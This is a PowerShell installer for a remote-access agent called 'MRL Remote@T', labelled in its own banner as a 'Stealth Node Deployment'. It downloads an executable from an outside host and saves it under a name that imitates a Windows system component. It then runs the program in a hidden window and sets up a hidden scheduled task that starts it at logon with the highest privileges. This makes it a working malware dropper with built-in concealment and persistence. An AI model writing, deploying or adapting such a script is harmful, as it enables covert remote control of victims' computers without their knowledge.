# ================================================================
# MRL Remote@T | Node Deployment Script v2.0
# ================================================================
$banner = @"
  __  __ ___ _     ___                      _       _____
 |  \/  |  _ \ |  |  _ \ ___ _ __ ___   ___| |_ ___|_   _|
 | |\/| | |_) | | _| |_) / _ \ '_ \ _ \ / _ \ __/ _ \| |
 | |  | |  _ <| |_|  _ <  __/ | | | | | (_) | ||  __/| |
 |_|  |_|_| \_\\__|_| \_\___|_| |_| |_|\___/ \__\___||_|
"@
Write-Host $banner -ForegroundColor Cyan
Write-Host "  MRL Remote@T | Stealth Node Deployment v2.0" -ForegroundColor White
Write-Host "  ================================================" -ForegroundColor DarkCyan
Write-Host ""

$serverBase = "https://web-production-d6db5.up.railway.app"
$exeUrl     = "$serverBase/api/agent.exe"
$targetDir  = "$env:APPDATA\WindowsSystemCore"
$targetExe  = "$targetDir\sys_core.exe"

# ---- Kill existing agent if running ----
Write-Host "[*] Checking for existing agent process..." -ForegroundColor Yellow
Stop-Process -Name "sys_core" -Force -ErrorAction SilentlyContinue
Stop-Process -Name "mrl_agent" -Force -ErrorAction SilentlyContinue
Start-Sleep -Milliseconds 500

# ---- Ensure target directory ----
if (-not (Test-Path $targetDir)) {
    New-Item -ItemType Directory -Path $targetDir -Force | Out-Null
}

# ---- Download with retry logic ----
Write-Host "[*] Downloading secure agent (~110MB) - Please wait..." -ForegroundColor Yellow
$maxRetries = 3
$success = $false
for ($i = 1; $i -le $maxRetries; $i++) {
    try {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("User-Agent", "MRL-Installer/2.0")
        $wc.DownloadFile($exeUrl, $targetExe)
        $success = $true
        break
    } catch {
        if ($i -lt $maxRetries) {
            Write-Host "[!] Download failed (attempt $i/$maxRetries). Retrying in 3s..." -ForegroundColor DarkYellow
            Start-Sleep -Seconds 3
        }
    }
}

if (-not $success -or -not (Test-Path $targetExe)) {
    Write-Host "[!] All download attempts failed. Check your connection and try again." -ForegroundColor Red
    pause
    return
}

$sizeMB = [math]::Round((Get-Item $targetExe).Length / 1MB, 1)
Write-Host "[+] Download complete! ($sizeMB MB)" -ForegroundColor Green

# ---- Launch agent silently ----
Write-Host "[*] Initializing secure node..." -ForegroundColor Yellow
Start-Process -FilePath $targetExe -WindowStyle Hidden -ErrorAction SilentlyContinue
Start-Sleep -Milliseconds 800

# ---- Persist agent to startup via scheduled task ----
$taskName = "WindowsSystemCore"
$existingTask = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
if (-not $existingTask) {
    try {
        $action  = New-ScheduledTaskAction -Execute $targetExe
        $trigger = New-ScheduledTaskTrigger -AtLogOn
        $settings = New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit 0 -RestartCount 999 -RestartInterval (New-TimeSpan -Minutes 1)
        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -RunLevel Highest -Force | Out-Null
        Write-Host "[+] Persistence established via Task Scheduler." -ForegroundColor Green
    } catch {
        Write-Host "[~] Scheduler persistence skipped (requires elevation)." -ForegroundColor DarkGray
    }
}

Write-Host ""
Write-Host "[+] Node successfully deployed! You can close this window." -ForegroundColor Cyan
Write-Host "    The agent is running securely in the background." -ForegroundColor DarkGray
Start-Sleep -Seconds 2
